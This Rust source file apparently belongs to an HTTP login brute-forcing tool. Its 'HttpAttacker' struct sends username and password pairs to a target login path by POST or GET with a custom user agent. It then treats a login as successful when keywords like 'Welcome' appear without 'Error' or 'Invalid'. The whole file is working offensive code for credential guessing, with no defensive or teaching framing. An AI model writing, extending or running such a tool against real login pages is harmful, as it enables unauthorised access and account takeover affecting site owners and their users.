use reqwest::Client;
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, COOKIE};
use std::collections::HashMap;
use regex::Regex;
use url::Url;

pub struct HttpAttacker {
    client: Client,
    target: String,
    path: String,
    method: String,
    success_indicators: Vec<String>,
    fail_indicators: Vec<String>,
    custom_headers: HashMap<String, String>,
}

impl HttpAttacker {
    pub fn new(client: Client, target: String) -> Self {
        Self {
            client,
            target,
            path: "/".to_string(),
            method: "GET".to_string(),
            success_indicators: vec!["Welcome".to_string(), "Success".to_string()],
            fail_indicators: vec!["Invalid".to_string(), "Error".to_string(), "Failed".to_string()],
            custom_headers: HashMap::new(),
        }
    }
    
    pub fn set_path(&mut self, path: &str) {
        self.path = path.to_string();
    }
    
    pub fn set_method(&mut self, method: &str) {
        self.method = method.to_uppercase();
    }
    
    pub fn add_success_indicator(&mut self, indicator: &str) {
        self.success_indicators.push(indicator.to_string());
    }
    
    pub async fn attempt_login(&self, username: &str, password: &str) -> bool {
        let full_url = format!("{}{}", self.target, self.path);
        
        let mut headers = HeaderMap::new();
        headers.insert(USER_AGENT, HeaderValue::from_static("Mxm-vyper/0.1"));
        
        for (key, value) in &self.custom_headers {
            if let Ok(header_value) = HeaderValue::from_str(value) {
                headers.insert(key.parse().unwrap(), header_value);
            }
        }
        
        let response = match self.method.as_str() {
            "POST" => {
                let params = vec![("user", username), ("pass", password)];
                self.client.post(&full_url)
                    .headers(headers)
                    .form(&params)
                    .send()
                    .await
            },
            "GET" => {
                let url_with_params = format!("{}?user={}&pass={}", full_url, username, password);
                self.client.get(&url_with_params)
                    .headers(headers)
                    .send()
                    .await
            },
            _ => return false,
        };
        
        match response {
            Ok(resp) => {
                if let Ok(body) = resp.text().await {
                    // Verificar indicadores de éxito
                    for indicator in &self.success_indicators {
                        if body.contains(indicator) {
                            // Verificar que no hay indicadores de fallo
                            let mut has_fail = false;
                            for fail_ind in &self.fail_indicators {
                                if body.contains(fail_ind) {
                                    has_fail = true;
                                    break;
                                }
                            }
                            if !has_fail {
                                return true;
                            }
                        }
                    }
                }
                false
            },
            Err(_) => false,
        }
    }
}
